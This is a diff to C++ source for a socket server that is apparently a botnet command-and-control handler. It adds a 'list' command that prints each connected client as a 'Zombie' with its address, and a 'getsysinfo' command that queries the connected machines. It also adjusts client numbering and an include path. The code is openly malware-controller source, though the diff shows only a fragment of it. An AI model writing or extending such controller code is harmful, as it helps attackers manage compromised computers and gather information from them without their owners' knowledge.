@@ -4,7 +4,7 @@
 #include <thread>
 #include <mutex>
 #include <iostream>
-#include "D:\ESIREM\C++\LPC\LPC\LPC\LPC_handler\LPC_handler\Scripts.h"
+#include "Scripts_s.h"
 
 Server::Server(const int pPort) : port(pPort), Socket_()
 {
@@ -57,7 +57,20 @@ bool Server::send_c()
 	}
 	else if (strcmp(b, "help") == 0 || strcmp(b, "HELP") == 0)
 	{
-		print_help();
+		//print_help();
+	}
+	else if (!(strcmp(b, "list")))
+	{
+		list(this);
+		std::cout << clients.size() << std::endl;
+		for (int i = 0; i < clients.size(); i++)
+		{
+			std::cout << "Zombie " << clients[i].number << " addr: " << clients[i].addr << std::endl;
+		}
+	}
+	else if (!(strcmp(b, "getsysinfo")))
+	{
+		getsysinfo(this);
 	}
 	else if (!(this->send_b(b))) { return 1; }
 	else { return 0; }
@@ -86,9 +99,9 @@ bool Server::acceptClient()
 		std::string clientAddress = inet_ntop(addr.sin_family, (void*)&(addr.sin_addr), buff, INET6_ADDRSTRLEN);
 		std::cout << "New client accepted :  " << clientAddress.c_str() << ":" << addr.sin_port << std::endl;
 		NewClient.sock = newClient;
-		NewClient.addr = addr;
+		NewClient.addr = (clientAddress.c_str());
+		NewClient.number = (clients.size()+1);
 		clients.push_back(NewClient);
-		NewClient.number = clients.size();
 		if (clients.size() == 1) 
 		{
 			default_client = NewClient;
